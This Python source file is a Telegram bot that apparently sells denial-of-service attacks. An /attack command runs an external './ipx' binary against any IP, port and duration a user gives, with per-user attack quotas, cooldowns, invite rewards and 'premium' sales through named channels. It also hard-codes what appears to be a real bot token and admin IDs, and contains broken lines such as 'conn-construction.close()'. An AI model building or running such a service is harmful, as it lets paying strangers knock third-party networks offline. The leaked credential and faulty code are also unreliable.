import subprocess
import sqlite3
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import TelegramError
import logging
import asyncio
import os

# Bot configuration
BOT_TOKEN = "7650135918:AAHRu19RMhRZFCTPAjiJ6RZJFk8peO6EcJE"  # Replace with your bot's token
ADMIN_IDS = {1476533257,6155412817}  # Replace with admin Telegram IDs
APPROVED_GROUPS = set()  # Will be populated from database
INVITE_CHANNEL = "@AASHUMODZ"
FEEDBACK_CHANNEL = "@AASHUFREEMODZ"
CONTACT_ADMINS = "@AashuZodYt/@@VxLeaderYT"

# Database setup
DB_FILE = "ddos_bot.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    attacks_left INTEGER DEFAULT 3,
                    last_attack REAL DEFAULT 0,
                    invites INTEGER DEFAULT 0
                 )''')
    c.execute('''CREATE TABLE IF NOT EXISTS groups (
                    group_id INTEGER PRIMARY KEY,
                    approved INTEGER DEFAULT 0
                 )''')
    c.execute('''CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                 )''')
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('cooldown', '300')")
    conn.commit()
    conn.close()

# Load approved groups from database
def load_approved_groups():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT group_id FROM groups WHERE approved = 1")
    APPROVED_GROUPS.update(row[0] for row in c.fetchall())
    conn.close()

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Check if user is admin
def is_admin(user_id):
    return user_id in ADMIN_IDS

# Check if group is approved
def is_group_approved(chat_id):
    return chat_id in APPROVED_GROUPS

# Check if user is banned (placeholder, assumes group-specific bans)
def is_banned(user_id, chat_id):
    return False  # Implement ban logic if needed

# Get user data
def get_user_data(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT attacks_left, last_attack, invites FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if row:
        data = {"attacks_left": row[0], "last_attack": row[1], "invites": row[2]}
    else:
        c.execute("INSERT INTO users (user_id, attacks_left, last_attack, invites) VALUES (?, 3, 0, 0)", (user_id,))
        conn.commit()
        data = {"attacks_left": 3, "last_attack": 0, "invites": 0}
    conn.close()
    return data

# Update user data
def update_user_data(user_id, attacks_left=None, last_attack=None, invites=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if attacks_left is not None:
        c.execute("UPDATE users SET attacks_left = ? WHERE user_id = ?", (attacks_left, user_id))
    if last_attack is not None:
        c.execute("UPDATE users SET last_attack = ? WHERE user_id = ?", (last_attack, user_id))
    if invites is not None:
        c.execute("UPDATE users SET invites = ? WHERE user_id = ?", (invites, user_id))
    conn.commit()
    conn.close()

# Get cooldown setting
def get_cooldown():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = 'cooldown'")
    cooldown = int(c.fetchone()[0])
    conn.close()
    return cooldown

# Set cooldown setting
def set_cooldown(seconds):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE settings SET value = ? WHERE key = 'cooldown'", (seconds,))
    conn.commit()
    conn.close()

# Attack process management
attack_process = None

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_group_approved(chat_id):
        await update.message.reply_text("This group is not approved to use the bot.")
        return

    if is_banned(user_id, chat_id):
        await update.message.reply_text("You are banned from using this bot in this group.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /sexy <IP> <PORT> <TIME>")
        return

    ip, port, time_str = args
    try:
        port = int(port)
        time_val = int(time_str)
        if port < 1 or port > 65535:
            raise ValueError("Port must be between 1 and 65535")
        if time_val < 1:
            raise ValueError("Time must be positive")
    except ValueError as e:
        await update.message.reply_text(f"Invalid input: {e}")
        return

    user_data = get_user_data(user_id)
    current_time = time.time()
    cooldown = get_cooldown()

    if not is_admin(user_id):
        if user_data["attacks_left"] <= 0 and user_data["invites"] <= 0:
            await update.message.reply_text(
                f"You've reached the attack limit. Invite someone to {INVITE_CHANNEL} for +1 attack or contact {CONTACT_ADMINS} for premium."
            )
            return
        if current_time - user_data["last_attack"] < cooldown:
            remaining = int(cooldown - (current_time - user_data["last_attack"]))
            await update.message.reply_text(f"Global cooldown active. Wait {remaining} seconds.")
            return

    if attack_process and attack_process.poll() is None:
        await update.message.reply_text("An attack is already running. Use /stop to cancel it (admin only).")
        return

    try:
        attack_process = subprocess.Popen(["./ipx", ip, str(port), str(time_val)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if not is_admin(user_id):
            new_attacks_left = user_data["attacks_left"] - 1 if user_data["attacks_left"] > 0 else user_data["attacks_left"]
            new_invites = user_data["invites"] - 1 if new_attacks_left <= 0 else user_data["invites"]
            update_user_data(user_id, attacks_left=new_attacks_left, last_attack=current_time, invites=new_invites)
        await update.message.reply_text(
            f"Attack started on {ip}:{port} for {time_val} seconds.\n"
            f"Please send a screenshot to {FEEDBACK_CHANNEL} after the attack."
        )
    except Exception as e:
        await update.message.reply_text(f"Failed to start attack: {e}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /stop.")
        return
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        try:
            attack_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            attack_process.kill()
        await update.message.reply_text("Attack stopped.")
    else:
        await update.message.reply_text("No attack is running.")

async def check_cooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    current_time = time.time()
    cooldown = get_cooldown()
    if current_time - user_data["last_attack"] < cooldown:
        remaining = int(cooldown - (current_time - user_data["last_attack"]))
        await update.message.reply_text(f"Global cooldown active. Wait {remaining} seconds.")
    else:
        await update.message.reply_text("No cooldown active. You can attack.")

async def check_remaining_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    if is_admin(user_id):
        await update.message.reply_text("Admins have unlimited attacks.")
    else:
        await update.message.reply_text(
            f"Remaining attacks: {user_data['attacks_left']}\n"
            f"Invites for extra attacks: {user_data['invites']}"
        )

async def checkinvite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /checkinvite.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /checkinvite <user_id>")
        return
    try:
        target_id = int(context.args[0])
        user_data = get_user_data(target_id)
        update_user_data(target_id, invites=user_data["invites"] + 1)
        await update.message.reply_text(f"Added +1 invite for user {target_id}. They now have {user_data['invites'] + 1} invites.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"For help or to buy premium, contact {CONTACT_ADMINS}.\n"
        f"Join {INVITE_CHANNEL} & {FEEDBACK_CHANNEL} to use the bot!"
    )

async def vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /vps.")
        return
    # Example VPS specs (replace with actual system checks if needed)
    await update.message.reply_text("VPS Specs:\nCPU: 4 cores\nRAM: 8GB\nStorage: 100GB SSD")

async def update(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /update.")
        return
    await update.message.reply_text("Restarting bot for updates...")
    os._exit(0)  # Force exit for restart (handle via external script if needed)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /broadcast.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT group_id FROM groups WHERE approved = 1")
    groups = c.fetchall()
    conn.close()
    for group_id in groups:
        try:
            await context.bot.send_message(chat_id=group_id[0], text=message)
        except TelegramError:
            continue
    await update.message.reply_text("Broadcast sent to all approved groups.")

async def addgroup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /addgroup.")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO groups (group_id, approved) VALUES (?, 0)", (chat_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text("Group added for broadcasts. Use /approve to enable bot usage.")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /approve.")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE groups SET approved = 1 WHERE group_id = ?", (chat_id,))
    conn.commit()
    conn-construction.close()
    APPROVED_GROUPS.add(chat_id)
    await update.message.reply_text("Group approved for bot usage.")

async def disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /disapprove.")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE groups SET approved = 0 WHERE group_id = ?", (chat_id,))
    conn.commit()
    conn.close()
    APPROVED_GROUPS.discard(chat_id)
    await update.message.reply_text("Group disapproved. Bot usage disabled.")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /unban.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    await update.message.reply_text("Unban not implemented. Add ban logic as needed.")

async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /reset.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /reset <user_id>")
        return
    try:
        target_id = int(context.args[0])
        update_user_data(target_id, attacks_left=3, last_attack=0, invites=0)
        await update.message.reply_text(f"User {target_id}'s attacks reset to 3, cooldown cleared, invites reset.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")

async def setcooldown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /setcooldown.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(context.args[0])
        if seconds < 0:
            raise ValueError("Cooldown cannot be negative")
        set_cooldown(seconds)
        await update.message.reply_text(f"Global cooldown set to {seconds} seconds.")
    except ValueError:
        await update.message.reply_text("Invalid cooldown value.")

async def viewusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /viewusers.")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, attacks_left, invites FROM users")
    users = c.fetchall()
    conn.close()
    if not users:
        await update.message.reply_text("No users found.")
        return
    message = "Users:\n"
    for user in users:
        message += f"ID: {user[0]}, Attacks Left: {user[1]}, Invites: {user[2]}\n"
    await update.message.reply_text(message)

async def groups(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /groups.")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT group_id, approved FROM groups")
    groups = c.fetchall()
    conn.close()
    if not groups:
        await update.message.reply_text("No groups found.")
        return
    message = "Groups:\n"
    for group in groups:
        status = "Approved" if group[1] else "Not Approved"
        message += f"ID: {group[0]}, Status: {status}\n"
    await update.message.reply_text(message)

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Only admins can use /shutdown.")
        return
    await update.message.reply_text("Shutting down bot...")
    os._exit(0)

def main():
    init_db()
    load_approved_groups()
    app = Application.builder().token(BOT_TOKEN).build()

    # Register command handlers
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("check_cooldown", check_cooldown))
    app.add_handler(CommandHandler("check_remaining_attack", check_remaining_attack))
    app.add_handler(CommandHandler("checkinvite", checkinvite))
    app.add_handler(CommandHandler("contact", contact))
    app.add_handler(CommandHandler("vps", vps))
    app.add_handler(CommandHandler("update", update))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addgroup", addgroup))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("disapprove", disapprove))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("reset", reset))
    app.add_handler(CommandHandler("setcooldown", setcooldown))
    app.add_handler(CommandHandler("viewusers", viewusers))
    app.add_handler(CommandHandler("groups", groups))
    app.add_handler(CommandHandler("shutdown", shutdown))

    app.run_polling()

if __name__ == "__main__":
    main()